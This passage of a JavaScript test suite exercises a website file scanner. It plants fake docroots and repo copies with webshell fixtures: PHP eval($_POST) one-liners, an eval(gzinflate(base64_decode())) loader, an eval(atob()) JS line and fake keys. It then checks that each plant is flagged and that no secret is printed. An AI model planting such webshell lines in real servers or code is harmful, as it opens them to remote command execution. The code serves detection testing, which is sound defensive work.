  console.log(`note fake docroot built at ${m.sha.slice(0, 8)}; live capture overlay ${usedCapture ? 'USED (' + CAPTURE.split('/').slice(-3).join('/') + ')' : 'absent: synthetic foreign build only'}; running as ${IS_ROOT ? 'root' : 'non-root (ownership plants skipped)'}`)
  if (!IS_ROOT) skipped.push('ownership plants (need root to chown)')

  const clean = scan.scanLive({ root: CLEAN, manifest })
  check(clean.findings.length === 0, 'CLEAN docroot: zero findings (nothing unknown, nothing flagged)', clean.findings.slice(0, 6).map((r) => `${r.area}:${r.path}[${r.verdict}:${flagsOf(r).join('+')}]`).join(' '))
  check(clean.counts.UNKNOWN === 0 && clean.counts.SUSPICIOUS === 0 && clean.counts.KNOWN === clean.counts.judged, `CLEAN docroot: every one of ${clean.counts.judged} judged entries is KNOWN`)
  check(clean.records.every((r) => r.rule), 'CLEAN docroot: every KNOWN entry names the rule that explains it')
  const sample = (rule) => clean.records.filter((r) => r.rule === rule).length
  const kinds = ['repo:head', 'repo-normalized', 'referenced-by-live-index', 'live-entry', 'live-config-js', 'priv-api-config', 'priv-gateway-config', 'media-image', 'media-htaccess-refuses-php', 'bk-deploy', 'rel-deploy', 'top-dockerfile', 'copy-site-old', 'acme-challenge']
  const missingRules = kinds.filter((k) => sample(k) === 0 && !(k === 'live-config-js' && usedCapture === false && false))
  check(missingRules.length === 0 || missingRules.every((k) => ['live-config-js'].includes(k)), 'CLEAN docroot: each kind of evidence is exercised', `unused: ${missingRules.join(' ')}`)
  check(clean.lastDeploy?.name === DEPLOY_NAME && clean.lastDeploy.ms === DEPLOY_MS, `the last deploy is read from backups/ and releases/ names (${clean.lastDeploy?.name})`)
  check(clean.build.kind === 'FOREIGN', 'the live index.html is reported as a FOREIGN build (no sporta-build marker)')
  check(clean.reachedCount > 15, `the reference walk reached ${clean.reachedCount} site files from the live index.html`)

  const trace = []
  const res = scan.scanLive({ root: PLANT, manifest, trace })
  const out = scan.render(res); res.__lines = out
  console.log(`note planted docroot: ${res.counts.judged} judged, KNOWN=${res.counts.KNOWN} UNKNOWN=${res.counts.UNKNOWN} SUSPICIOUS=${res.counts.SUSPICIOUS}, findings ${res.findings.length}`)
  const planByKey = new Set()
  for (const p of PLANTS) {
    if (p.needsRoot && !IS_ROOT) continue
    const r = findRec(res, p.area, p.path)
    check(!!r && p.test(r, res), `plant ${p.id}: ${p.area}:${JSON.stringify(p.path).slice(0, 60)} found as expected`, r ? `${r.verdict} ${r.sev} ${flagsOf(r).join('+')} reach=${r.reach} exec=${r.exec}` : 'no record')
    planByKey.add(`${p.area}|${p.path}`)
  }
  // nothing else is flagged: the KNOWN files stay unflagged
  const stray = res.findings.filter((r) => !planByKey.has(`${r.area}|${r.path}`))
  check(stray.length === 0, 'NOTHING ELSE is flagged: every other file is still KNOWN and unflagged', stray.slice(0, 6).map((r) => `${r.area}:${r.path}[${r.verdict}:${flagsOf(r).join('+')}]`).join(' '))
  const cleanKnown = new Map(clean.records.map((r) => [`${r.area}|${r.path}`, r.rule]))
  const changed = res.records.filter((r) => !planByKey.has(`${r.area}|${r.path}`) && cleanKnown.get(`${r.area}|${r.path}`) !== r.rule)
  check(changed.length === 0, 'every unplanted entry kept the very rule that explained it in the clean run', changed.slice(0, 4).map((r) => `${r.path}: ${cleanKnown.get(`${r.area}|${r.path}`)} -> ${r.rule}`).join(' '))
  const expectSusp = new Set(PLANTS.filter((p) => (IS_ROOT || !p.needsRoot) && /verdict === 'SUSPICIOUS'/.test(p.test.toString())).map((p) => `${p.area}|${p.path}`))
  check(res.counts.SUSPICIOUS === expectSusp.size, `the planted run reports exactly the ${expectSusp.size} SUSPICIOUS entries that were planted`, `got ${res.counts.SUSPICIOUS}`)
  check(res.bySev.high >= 14, `and ${res.bySev.high} high-severity findings`)
  check(res.reachableExec >= 5, `MODEL line counts the executable unknown files in web-reachable directories (${res.reachableExec})`)

  // ---- privacy
  console.log('\n== live: privacy')
  const rel = (abs) => path.relative(PLANT, abs).split(path.sep).join('/')
  const opened = trace.map((t) => rel(t.path))
  const NEVER = ['private/api-config.php', 'private/config/knet-config.php', 'private/config/pay-config.php', 'private/db_name', 'private/db_user', 'private/db_pass', 'private/mail/password',
    'private/backup-secrets/db-backup.key', 'private/voice/knet-payments.log', 'private/backups/sporta-db-20261103T020000Z.sql.gz.enc', 'private/backups/leak.sql.gz', 'private/api-config.prev-20261031.php',
    'site/config.php', 'backups/claude-20261031T1325Z/api-config.php', 'backups/claude-20261031T1515Z/orders-stock.sql.gz', 'apache-service.override.yml']
  check(NEVER.every((p) => !opened.includes(p)), `credential, dump, log and config-looking files are never opened (${NEVER.length} sentinel-bearing files checked)`, NEVER.filter((p) => opened.includes(p)).join(' '))
  const priv = opened.filter((p) => p.startsWith('private/') && !p.startsWith('private/media/'))
  const independentOk = (p) => fs.statSync(path.join(PLANT, p)).size < 65536 && !/(?:config|secret|passw|_pass|_user|_name|\.key|\.pem|\.log|\.sql|\.enc|\.gz|mail|\.env)/i.test(p)
  check(priv.every(independentOk), `under private/ only small non-credential files are opened (${priv.length}: ${priv.slice(0, 4).join(' ')} …)`, priv.filter((p) => !independentOk(p)).join(' '))
  check(opened.filter((p) => /^(?:backups|releases)\//.test(p)).every(independentOk), 'under backups/ and releases/ only small non-credential files are opened')
  const allText = [...out, scan.detailsNdjson(res), JSON.stringify(res.records)].join('\n')
  check(!allText.includes(SENTINEL), 'no sentinel secret value appears in the output, the details file or the JSON')
  check(!allText.includes(FAKE_AWS) && allText.includes('AKIA****'), 'a secret hit prints a 4-character mask only')
  check(res.records.every((r) => r.sigs.every((s) => !s.mask || s.mask.length <= 9)), 'masks are at most 4 characters of the value plus ****')
  check(!out.some((l) => /[\u0000-\u001f\u007f]/.test(l)) && out.every((l) => l.length <= 520), 'no control character (a newline included) reaches the log and no line is longer than 520 characters')
  const lnkDir = fs.mkdtempSync(path.join(TMP, 'io-')), tgt = path.join(lnkDir, 't.txt')
  fs.writeFileSync(tgt, 'x'); fs.symlinkSync(tgt, path.join(lnkDir, 't.lnk')); spawnSync('mkfifo', [path.join(lnkDir, 'p')])
  const io = scan.makeIo()
  check(io.read(tgt)?.toString() === 'x' && io.read(path.join(lnkDir, 't.lnk')) === null && io.read(path.join(lnkDir, 'p')) === null && io.head(path.join(lnkDir, 'p')) === null, 'io.read/io.head refuse a symlink and a FIFO (O_NOFOLLOW, O_NONBLOCK, fstat must say regular file)')
  check(!scan.scanLive.toString().includes('writeFileSync') && !scan.scanLive.toString().includes('unlinkSync') && !scan.scanLive.toString().includes('rmSync') && !scan.scanLive.toString().includes('renameSync'), 'scanLive contains no write, delete or rename call')

  // ---- output budget, paging, details
  console.log('\n== live: output')
  const cli = runCli(['--root', PLANT, '--manifest', mfPath, '--details', path.join(TMP, 'details.ndjson')])
  const cliLines = lines(cli.stdout)
  check(cli.status === 0 && cliLines.at(-1) === 'FILES_SCAN_DONE' && cliLines[0].startsWith('FILES_SCAN root='), 'CLI exits 0 and prints FILES_SCAN … FILES_SCAN_DONE')
  check(cliLines.length <= 240, `default output fits a 300-entry job log (${cliLines.length} lines)`)
  check(runCli(['--root', PLANT, '--manifest', mfPath, '--fail-on', 'suspicious']).status === 1 && runCli(['--root', CLEAN, '--manifest', mfPath, '--fail-on', 'suspicious']).status === 0, '--fail-on suspicious: exit 1 on the planted docroot, 0 on the clean one')
  const detail = fs.readFileSync(path.join(TMP, 'details.ndjson'), 'utf8').split('\n').filter(Boolean)
  check(detail.length === res.findings.length && detail.every((l) => { const o = JSON.parse(l); return o.path && o.verdict && 'size' in o && 'mtime' in o && 'mode' in o && 'uid' in o && 'type' in o && 'flags' in o }), `the details file has one record per finding (${detail.length}) with path, size, mtime, mode, uid, type and flags`)
  check((fs.statSync(path.join(TMP, 'details.ndjson')).mode & 0o777) === 0o600, 'the details file is written 0600')
  // a flood: the log cap, paging and the details reader
  const FLOOD = path.join(TMP, 'flood')
  fs.mkdirSync(FLOOD); buildFake(FLOOD, m.sha, { capture: false })
  for (let i = 0; i < 700; i++) put(FLOOD, `site/assets/Orphan${i}-${String(i).padStart(8, '0')}.js`, `export default ${i}`, { uid: 501 })
  for (let i = 0; i < 300; i++) put(FLOOD, `site/shells/s${i}.php`, "<?php eval($_POST['a']);", { uid: 33 })
  for (let i = 0; i < 250; i++) put(FLOOD, `site/misc/note${i}.txt`, 'n', { uid: 501 })
  const fl = runCli(['--root', FLOOD, '--manifest', mfPath, '--details', path.join(TMP, 'flood.ndjson')])
  const flLines = lines(fl.stdout)
  const flRes = scan.scanLive({ root: FLOOD, manifest })
  check(flLines.length <= 240 && flLines.at(-1) === 'FILES_SCAN_DONE', `a flood of ${flRes.findings.length} findings still prints ${flLines.length} lines (cap 240)`)
  check(flLines.some((l) => /more finding line\(s\) not printed/.test(l)), 'the flood output says how many lines were left out and how to page them')
  check(flLines.filter((l) => l.startsWith('F ')).slice(0, 60).every((l) => /^F H SUSPICIOUS/.test(l)), 'the high-severity findings are printed first')
  const pageSize = 200, total = Math.ceil(flRes.findings.length / pageSize), seen = []
  for (let p = 1; p <= total; p++) {
    const pg = lines(runCli(['--root', FLOOD, '--manifest', mfPath, '--page', String(p), '--page-size', String(pageSize)]).stdout)
    check(pg.some((l) => l === `PAGE ${p}/${total} findings ${flRes.findings.length} (${pageSize} per page, severity order)`), `page ${p}/${total} announces itself`)
    seen.push(...pg.filter((l) => l.startsWith('F ')))
  }
  check(seen.length === flRes.findings.length && new Set(seen).size === seen.length, `the pages cover all ${flRes.findings.length} findings exactly once`)
  const rd = lines(runCli(['--read', path.join(TMP, 'flood.ndjson'), '--page', '2', '--page-size', String(pageSize)]).stdout)
  const rs = lines(runCli(['--root', FLOOD, '--manifest', mfPath, '--page', '2', '--page-size', String(pageSize)]).stdout)
  check(rd.filter((l) => l.startsWith('F ')).join('\n') === rs.filter((l) => l.startsWith('F ')).join('\n') && rd.some((l) => l.startsWith('PAGE 2/')), '--read pages a saved details file to the same lines a re-scan page prints')
  const envPage = lines(runCli(['--root', FLOOD, '--manifest', mfPath], { SCAN_PAGE: '1', SCAN_PAGE_SIZE: '5' }).stdout)
  check(envPage.filter((l) => l.startsWith('F ')).length === 5, 'SCAN_PAGE and SCAN_PAGE_SIZE work from the environment (what a second job sets)')

  // ---- the reference walk equals old-files-inventory.mjs
  console.log('\n== live: reference walk vs scripts/old-files-inventory.mjs')
  const old = spawnSync(process.execPath, [path.join(HERE, 'old-files-inventory.mjs'), path.join(CLEAN, 'site')], { encoding: 'utf8', env: { ...process.env, OLD_FILES_VERBOSE: '1' }, timeout: 120000 })
  const oldRef = new Set(lines(old.stdout).filter((l) => l.startsWith('F REFERENCED')).map((l) => l.split(/\s+/)[5]))
  const truncated = lines(old.stdout).some((l) => /^F \.\.\. \d+ more flagged/.test(l))
  const LISTED = /\.(m?js|cjs|css|html?|php|map|json|txt|xml|webmanifest)$/i
  const mine = new Set([...clean.reached.keys()].filter((p) => LISTED.test(p) || p === '.htaccess' || p.endsWith('/.htaccess')))
  if (truncated) skipped.push('walk comparison truncated by old-files-inventory MAX_F')
  const onlyOld = [...oldRef].filter((p) => !mine.has(p)), onlyMine = [...mine].filter((p) => !oldRef.has(p))
  check(oldRef.size > 10 && !truncated && onlyOld.length === 0 && onlyMine.length === 0, `both reference walks reach the same ${mine.size} listed files`, `only old-files-inventory: ${onlyOld.slice(0, 4).join(' ')} · only this: ${onlyMine.slice(0, 4).join(' ')}`)

  // ---- the job
  console.log('\n== live: the one-shot compose job')
  const jobPath = path.join(WEB, 'ops', 'live-files-scan.compose.json')
  const jobText = fs.existsSync(jobPath) ? fs.readFileSync(jobPath, 'utf8') : ''
  check(!!jobText, 'ops/live-files-scan.compose.json exists')
  if (jobText) {
    const job = JSON.parse(jobText), svc = job.services.filesscan
    check(svc.image === 'node:24-alpine' && svc.restart === 'no', 'the job is a one-shot node:24-alpine container')
    check(JSON.stringify(svc.volumes) === JSON.stringify(['/docker/sporta:/sporta:ro']), 'the only mount is /docker/sporta, read-only')
    check(svc.network_mode === 'none' && svc.read_only === true && !svc.privileged && !svc.pid && !svc.cap_add, 'no network, read-only root filesystem, not privileged, no host pid, no added capabilities')
    check(!/docker\.sock|\/etc\/|\/var\/lib\/docker/.test(jobText), 'no Docker socket, /etc or /var/lib/docker anywhere in the job')
    const lower = jobText.toLowerCase()
    check(!['curl', 'wget', 'require(', '$'].some((w) => lower.includes(w)), 'the job text holds no curl, wget, require( or dollar sign (the Hostinger API refuses them)')
    check(jobText.length < 100000, `the job is ${jobText.length} bytes (the earlier proven jobs are ~52 kB)`)
    check(gen.decode(svc.environment.SRC) === fs.readFileSync(SCANNER, 'utf8'), 'SRC decodes to exactly scripts/live-files-scan.mjs (regenerate with make-expected-manifest.mjs if this fails)')
    const emb = JSON.parse(gen.decode(svc.environment.MAN))
    check(emb.version === 1 && /^[0-9a-f]{40}$/.test(emb.sha) && gen.manifestJson(gen.buildManifest(emb.sha)) === gen.decode(svc.environment.MAN), `MAN is the manifest of its own recorded commit (${emb.sha.slice(0, 8)}), byte for byte`)
    const chk = spawnSync(process.execPath, [path.join(HERE, 'make-expected-manifest.mjs'), '--check'], { encoding: 'utf8' })
    check(chk.status === 0 && /^ok /.test(chk.stdout), `make-expected-manifest.mjs --check: ${chk.stdout.trim()}`)
    // run the job's own command line against a fake docroot built at the embedded commit
    const JR = path.join(TMP, 'jobroot'), JD = path.join(TMP, 'jobdir')
    fs.mkdirSync(JR); fs.mkdirSync(path.join(JD, 'out'), { recursive: true }); buildFake(JR, emb.sha, { capture: false })
    const cmd = svc.command[0].replaceAll('/tmp/', `${JD}/`).replaceAll('/out/', `${JD}/out/`).replaceAll('--root /sporta', `--root ${JR}`)
    const run = spawnSync('sh', ['-c', cmd], { encoding: 'utf8', env: { ...process.env, SRC: svc.environment.SRC, MAN: svc.environment.MAN }, timeout: 120000 })
    const jl = lines(run.stdout)
    check(run.status === 0 && jl.at(-1) === 'FILES_SCAN_DONE' && jl.some((l) => /KNOWN=\d+ \(flagged 0\) UNKNOWN=0 SUSPICIOUS=0/.test(l)), 'the job command (printenv | base64 -d | gunzip, then node) runs end to end: clean docroot, 0 unknown, 0 suspicious', (run.stderr || jl.slice(-3).join(' | ')).slice(0, 300))
    check(fs.existsSync(path.join(JD, 'out', 'details.ndjson')), 'the job writes its details file to /out (its own tmpfs)')
    const pageJob = JSON.parse(spawnSync(process.execPath, [path.join(HERE, 'make-expected-manifest.mjs'), '--stdout', '--env', 'SCAN_PAGE=2', '--env', 'SCAN_VERDICT=SUSPICIOUS'], { encoding: 'utf8' }).stdout || 'null')
    check(pageJob?.services?.filesscan?.environment?.SCAN_PAGE === '2' && pageJob.services.filesscan.environment.SCAN_VERDICT === 'SUSPICIOUS' && pageJob.services.filesscan.environment.SRC === svc.environment.SRC, '--stdout --env SCAN_PAGE=2 prints the read-a-page variant (same script, same manifest, one more variable)')
    check(spawnSync(process.execPath, [path.join(HERE, 'make-expected-manifest.mjs'), '--stdout', '--env', 'NODE_OPTIONS=x'], { encoding: 'utf8' }).status !== 0 && spawnSync(process.execPath, [path.join(HERE, 'make-expected-manifest.mjs'), '--stdout', '--env', 'SCAN_PAGE=$HOME'], { encoding: 'utf8' }).status !== 0, '--env refuses anything but SCAN_* names and plain values (no dollar sign)')
    const fetchJob = JSON.parse(spawnSync(process.execPath, [path.join(HERE, 'make-expected-manifest.mjs'), '--fetch', 'abcdef1', '--no-job'], { encoding: 'utf8' }).stdout || 'null')
    check(fetchJob?.services?.filesscan?.environment?.SRC === undefined && /raw\.githubusercontent\.com\/hkspower\/wain\/abcdef1\//.test(JSON.stringify(fetchJob)) && !JSON.stringify(fetchJob).includes('$'), '--fetch <sha> prints the small variant that downloads the script at a pushed commit')
  }
}

// ---------------------------------------------------------------- mutations
// A detector that cannot be blinded without a test failing is not tested. Each mutant edits a COPY of the
// scanner (never the real one), runs it on the same docroots, and the check it must break has to turn false.
async function mutations(CLEAN, PLANT, manifest) {
  console.log('\n== live: mutations (blind a detector, the matching check must fail)')
  const src = fs.readFileSync(SCANNER, 'utf8')
  const dir = fs.mkdtempSync(path.join(TMP, 'mut-'))
  const plantOk = (id) => (res) => { const p = PLANTS.find((x) => x.id === id); const r = findRec(res, p.area, p.path); return !!r && p.test(r, res) }
  const M = [
    { id: 'signatures', find: 'for (const s of SIGNATURES) {', repl: 'for (const s of []) {', kills: plantOk('signature-hit') },
    { id: 'exec-in-web-root', find: "if (rec.exec && rec.reach && rec.verdict !== 'KNOWN') flag(rec, 'executable-in-web-root'", repl: "if (false) flag(rec, 'executable-in-web-root'", kills: plantOk('foreign-index-php') },
    { id: 'symlink-escape', find: 'if (!inside) {', repl: 'if (false) {', kills: plantOk('symlink-escape') },
    { id: 'world-writable-dir', find: "if (d.st.mode & 0o002) flag(rec, 'world-writable-dir'", repl: "if (false) flag(rec, 'world-writable-dir'", kills: plantOk('world-writable-dir') },
    { id: 'setuid', find: 'if (ent.st.mode & 0o4000)', repl: 'if (false)', kills: plantOk('setuid') },
    { id: 'sql-dump', find: "if (DUMP_EXT.test(name) || rec.type === 'SQL dump')", repl: 'if (false)', kills: plantOk('dump-in-site') },
    { id: 'log-in-web-root', find: 'if (LOG_EXT.test(name)) flag(rec', repl: 'if (false) flag(rec', kills: plantOk('log-in-web-root') },
    { id: 'archive', find: 'if (ARCHIVE_EXT.test(name) || ARCHIVE.has(rec.type))', repl: 'if (false)', kills: plantOk('archive') },
    { id: 'vcs-dir', find: 'if (ent.isDir && !ent.isLink && /^\\.(?:git|svn|hg|idea|vscode)$/i.test(ent.name))', repl: 'if (false)', kills: plantOk('dot-git') },
    { id: 'fresh-after-deploy', find: "if (rec.age > 60000) flag(rec, 'newer-than-last-deploy'", repl: "if (false) flag(rec, 'newer-than-last-deploy'", kills: plantOk('fresh-php') },
    { id: 'deploy-stamp', find: 'const m = DEPLOY_STAMP.exec(n)', repl: 'const m = null', kills: plantOk('fresh-php') },
    { id: 'media-htaccess', find: 'if (m.files > 0 && !covered)', repl: 'if (false)', kills: plantOk('media-dir-no-htaccess') },
    { id: 'php-in-media', find: "if (rec.exec) flag(rec, 'php-in-media-folder'", repl: "if (false) flag(rec, 'php-in-media-folder'", kills: plantOk('php-in-media') },
    { id: 'reference-over-reach', find: "for (const r of WALK_ROOTS) if (files.has(r)) visit(r, '(root)')", repl: "for (const r of files) visit(r, '(root)')", kills: plantOk('orphan-chunk') },
    { id: 'modified-known-path', find: 'if (!verdict && man) {', repl: 'if (false) {', kills: plantOk('modified-api-code') },
    { id: 'blob-match', find: 'if (mt.hit) { setV(rec, ', repl: 'if (false) { setV(rec, ', cleanKills: true },
    { id: 'normalised-htaccess', find: 'if (i >= 0) { setV(rec, \'KNOWN\', \'repo-normalized\'', repl: 'if (false) { setV(rec, \'KNOWN\', \'repo-normalized\'', cleanKills: true },
    { id: 'deny-model', find: 'for (const s of h.denyFiles) if (s.rx.test(base))', repl: 'for (const s of []) if (s.rx.test(base))', kills: plantOk('dump-in-site') },
    { id: 'secret-name-open', find: 'const secretName = SECRET_NAME.test(ent.rel)', repl: 'const secretName = false', kills: plantOk('secret-shaped'), privacy: true },
    { id: 'private-read-policy', find: 'function mayOpen(rel, size, name) { return size < SMALL &&', repl: 'function mayOpen(rel, size, name) { return true ||', privacy: true },
    { id: 'mask', find: "else if (s.secret) h.mask = value.slice(0, s.keep ?? 2) + '****'", repl: 'else if (s.secret) h.mask = value', kills: plantOk('aws-key-in-text'), privacy: true },
    { id: 'uid-check', find: 'if (!uidsFor.site.includes(ent.st.uid)) flag(rec, `uid-unexpected:${ent.st.uid}`, rec.exec', repl: 'if (false) flag(rec, `uid-unexpected:${ent.st.uid}`, rec.exec', kills: plantOk('wrong-uid'), root: true },
    { id: 'polyglot', find: "if (phpInside && !rec.exec) flag(rec, 'php-in-non-php-file'", repl: "if (false) flag(rec, 'php-in-non-php-file'", kills: plantOk('polyglot') },
    { id: 'setup-tool', find: "if (man && man.flags.includes('s')) {", repl: 'if (false) {', kills: plantOk('setup-tool-php') },
    { id: 'ht-handler-signature', find: "{ name: 'ht-handler', langs: ['ht']", repl: "{ name: 'ht-handler', langs: ['none']", kills: plantOk('ht-handler') },
    { id: 'listing-open', find: 'if (effIndexes(d.rel)) {', repl: 'if (false) {', kills: plantOk('listing-open') },
    { id: 'world-readable-private', find: 'if (ent.st.mode & 0o004 && (cred ||', repl: 'if (false && (cred ||', kills: plantOk('dump-readable') },
    { id: 'credential-copy', find: "flag(rec, 'credential-copy'", repl: "flag(rec, 'credential-copy-x'", kills: plantOk('backup-credential-copy') },
    { id: 'path-escaping', find: 'const safe = (s) => {', repl: 'const safe = (s) => { return String(s)', kills: plantOk('forged-line') },
    { id: 'special-file', find: 'if (!ent.isFile) {\n      rec.type = \'special file (not opened)\'', repl: 'if (false) {\n      rec.type = \'special file (not opened)\'', kills: plantOk('fifo') },
    { id: 'nofollow-open', find: 'C.O_RDONLY | C.O_NOFOLLOW | C.O_NONBLOCK', repl: 'C.O_RDONLY', kills: plantOk('symlink-escape'), swap: true },
    { id: 'backups-dir-mode', find: 'if (area === \'backups\' && st0.mode & 0o005) {', repl: 'if (false) {', kills: plantOk('backups-dir-open') },
    { id: 'old-copy-vcs', find: "if (sum.vcs) flag(rec, 'vcs-metadata'", repl: "if (false) flag(rec, 'vcs-metadata'", kills: plantOk('old-copy-git') },
  ]
  for (const mu of M) {
    if (mu.root && !IS_ROOT) { skipped.push(`mutant ${mu.id} (needs root)`); continue }
    const count = src.split(mu.find).length - 1
    if (count < 1) { bad(`mutant ${mu.id} no longer applies (the scanner text it edits changed)`, mu.find.slice(0, 80)); continue }
    const file = path.join(dir, `scan-${mu.id}.mjs`)
    fs.writeFileSync(file, src.replaceAll(mu.find, mu.repl))
    let mod
    try { mod = await import(pathToFileURL(file).href) } catch (e) { bad(`mutant ${mu.id} does not load`, e.message); continue }
    if (mu.cleanKills) {
      const r = mod.scanLive({ root: CLEAN, manifest })
      check(r.findings.length > 0, `mutant ${mu.id}: the clean docroot stops being clean (${r.findings.length} findings)`)
    } else if (mu.swap) {
      // io.read must refuse a symlink even if the caller forgot to look: read through a link to a sentinel file
      const target = path.join(dir, 'sentinel.txt'), link = path.join(dir, 'sentinel.lnk')
      fs.writeFileSync(target, 'x'); try { fs.symlinkSync(target, link) } catch { /* exists */ }
      check(mod.makeIo().read(link) !== null, `mutant ${mu.id}: reading through a symlink is no longer refused`)
    } else if (mu.privacy) {
      const trace = []
      const r = mod.scanLive({ root: PLANT, manifest, trace })
      const text = [...mod.render(r), mod.detailsNdjson(r)].join('\n')
      const opened = trace.map((t) => path.relative(PLANT, t.path).split(path.sep).join('/'))
      const leaked = text.includes(SENTINEL) || text.includes(FAKE_AWS) || opened.includes('private/db_pass') || opened.includes('site/config.php')
      check(leaked, `mutant ${mu.id}: the privacy checks catch it (a secret is opened or printed)`)
    } else {
      const r = mod.scanLive({ root: PLANT, manifest })
      r.__lines = mod.render(r)
      check(!mu.kills(r), `mutant ${mu.id}: the matching plant is no longer found as expected`)
    }
  }
}

// ================================================================ repo section
// The REPO half of the unknown-files check: scripts/unknown-files-scan.mjs on a scratch copy of the tree
// (git archive of HEAD, then planted files), on a scratch history with a committed-then-deleted secret,
// on a fake staged package, and on the real tree.
//
//   node scripts/unknown-files-test.mjs --section repo
//
// WHAT "repo" PROVES
//   1. the clean scratch copy is a baseline; every planted file produces the finding it should (webshell-like
//      PHP in public/, base64+eval blob, .env, a private-key file with a FAKE random key, *.bak, PHP in a
//      media folder, double extension, polyglot image, executable bit, case collision, unexplained binary,
//      symlink, hidden file, SQL dump, zip holding a config.php, non-UTF-8 name, secrets in source, orphan
//      script, NUL byte in source, download-and-run shell line ...) and NOTHING ELSE is newly flagged
//   2. the scan writes nothing into the tree it scans and rewrites no history
//   3. history: a secret committed and deleted is found with its first commit and "not in HEAD", a config.php
//      ever added is named, the biggest blob is ranked first, a zip holding config.php is opened, a SQL dump
//      is named; no secret value reaches the JSON or the Markdown
//   4. the output is deterministic (two runs, byte-identical)
//   5. exit code: 0 when everything is explained, 1 for a stray file or a blocking finding
//   6. the fake package: an unknown PHP file, a forbidden config.php and an eval are found, file-audit.mjs runs
//   7. the real tree gives the documented result: no UNKNOWN file, no unexplained high finding, every blocking
//      finding documented in ops/known-files.json, every rule in the manifest still matches something
//   8. MUTATIONS: detectors are blinded (UFS_BLIND) and the check that depends on each must fail, and only that
//      one; an emptied manifest makes the baseline fill with UNKNOWN files
async function repoSection() {
  const SCAN = path.join(HERE, 'unknown-files-scan.mjs')
  const MAN = path.join(WEB, 'ops', 'known-files.json')
  let runNo = 0
  const rnd = (n) => crypto.randomBytes(n * 2).toString('base64').replace(/[^A-Za-z0-9]/g, '').padEnd(n, 'q').slice(0, n)
  const git = (cwd, ...args) => execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t', '-c', 'commit.gpgsign=false', ...args], { cwd, encoding: 'utf8', maxBuffer: 1 << 28, stdio: ['ignore', 'pipe', 'pipe'] })
  const scan = (root, extra = [], env = {}, manifest = MAN) => {
    const out = path.join(TMP, `repo-run-${++runNo}.json`), md = path.join(TMP, `repo-run-${runNo}.md`)
    const r = spawnSync(process.execPath, [SCAN, '--root', root, '--manifest', manifest, '--json', out, '--md', md, '--quiet', ...extra], { encoding: 'utf8', env: { ...process.env, ...env }, maxBuffer: 1 << 28 })
    const json = fs.existsSync(out) ? JSON.parse(fs.readFileSync(out, 'utf8')) : null
    return { status: r.status, stderr: r.stderr || '', json, text: json ? fs.readFileSync(out, 'utf8') + fs.readFileSync(md, 'utf8') : '' }
  }
  const findingsOf = (R) => R.json?.findings || []
  const has = (R, det, where) => findingsOf(R).some((f) => f.detector === det && (f.where === where || f.where.includes(where)))
  const key = (f) => `${f.detector}|${f.where}`
  const snapshot = (root) => [git(root, 'rev-parse', 'HEAD'), git(root, 'for-each-ref'), git(root, 'status', '--porcelain=v1', '-uall'), git(root, 'count-objects')].join('\n--\n')

  // ------------------------------------------------------------ the scratch copy
  const ROOT = path.join(TMP, 'tree')
  fs.mkdirSync(ROOT, { recursive: true })
  const arch = spawnSync('git', ['-C', REPO, 'archive', 'HEAD'], { maxBuffer: 1 << 30 })
  if (arch.status !== 0) { bad('git archive HEAD of the repo', String(arch.stderr)); return }
  const tar = spawnSync('tar', ['-x', '-C', ROOT], { input: arch.stdout, maxBuffer: 1 << 28 })
  check(tar.status === 0, 'scratch copy of the tree: git archive HEAD extracted')
  git(ROOT, 'init', '-q', '-b', 'main')
  git(ROOT, 'add', '-A')
  git(ROOT, 'commit', '-q', '-m', 'base')

  const B0 = scan(ROOT)
  check(!!B0.json && B0.json.counts.entries > 100, `baseline scan of the scratch copy runs (${B0.json?.counts?.entries} entries, ${B0.json?.counts?.unknown} unknown, exit ${B0.status})`, B0.stderr.slice(0, 300))
  if (!B0.json) return

  // ---------------------------------------------------------- history plants (committed, then deleted)
  const SEC_DB = rnd(26), SEC_CRON = rnd(24), SEC_PEM = crypto.randomBytes(300).toString('base64'), SEC_ZIP = rnd(20)
  const ZIPFILE = path.join(TMP, 'bundle.zip')
  const zdir = path.join(TMP, 'zsrc'); fs.mkdirSync(path.join(zdir, 'api'), { recursive: true })
  fs.writeFileSync(path.join(zdir, 'api/config.php'), `<?php return ['k' => '${SEC_ZIP}'];`)
  fs.writeFileSync(path.join(zdir, 'api/store.php'), '<?php echo 1;')
  const haveZip = spawnSync('zip', ['-q', '-r', ZIPFILE, 'api'], { cwd: zdir }).status === 0
  const old = path.join(ROOT, 'sporta-web/old-deploy')
  fs.mkdirSync(old, { recursive: true })
  fs.writeFileSync(path.join(old, 'config.php'), `<?php\nreturn [\n  'db_pass' => '${SEC_DB}',\n  'cron_key' => '${SEC_CRON}',\n];\n`)
  fs.writeFileSync(path.join(old, 'dump.sql'), `-- MySQL dump 10.13  Distrib 8.0.36\nINSERT INTO \`orders\` VALUES (1,'a');\nINSERT INTO \`orders\` VALUES (2,'b');\nINSERT INTO \`orders\` VALUES (3,'c');\nINSERT INTO \`orders\` VALUES (4,'d');\n-- Dump completed on 2026-01-01\n`)
  fs.writeFileSync(path.join(old, 'blob.bin'), crypto.randomBytes(3_000_000))
  if (haveZip) fs.copyFileSync(ZIPFILE, path.join(old, 'bundle.zip'))
  git(ROOT, 'add', '-f', 'sporta-web/old-deploy')
  git(ROOT, 'commit', '-q', '-m', 'add the old deploy')
  const H1 = git(ROOT, 'rev-parse', '--short=8', 'HEAD').trim()
  git(ROOT, 'rm', '-r', '-q', 'sporta-web/old-deploy')
  git(ROOT, 'commit', '-q', '-m', 'remove the old deploy')

  // ---------------------------------------------------------------- working-tree plants
  const planted = []
  const put = (rel, body, opt = {}) => {
    const p = path.join(ROOT, rel)
    fs.mkdirSync(path.dirname(p), { recursive: true })
    if (opt.link) fs.symlinkSync(opt.link, p)
    else fs.writeFileSync(p, body)
    if (opt.mode) fs.chmodSync(p, opt.mode)
    planted.push(rel)
  }
  const B64 = crypto.randomBytes(300).toString('base64')
  const KEY = `-----BEGIN OPENSSH PRIVATE KEY-----\n${SEC_PEM.match(/.{1,70}/g).join('\n')}\n-----END OPENSSH PRIVATE KEY-----\n`
  const AWS = 'AKIA' + 'ABCDEFGHIJKLMNOP'.split('').sort(() => Math.random() - 0.5).join('')
  const GH = 'gh' + 'p_' + rnd(36), APIK = rnd(40), ENVPW = rnd(24)
  put('sporta-web/public/shell.php', `<?php @eval($_POST['cmd']); ?>\n`)
  put('sporta-web/dropin/php-store/legacy-import.php', `<?php\neval(gzinflate(base64_decode('${B64}')));\n`)
  put('sporta-web/public/helper.js', `eval(atob('${B64.slice(0, 120)}'))\n`)
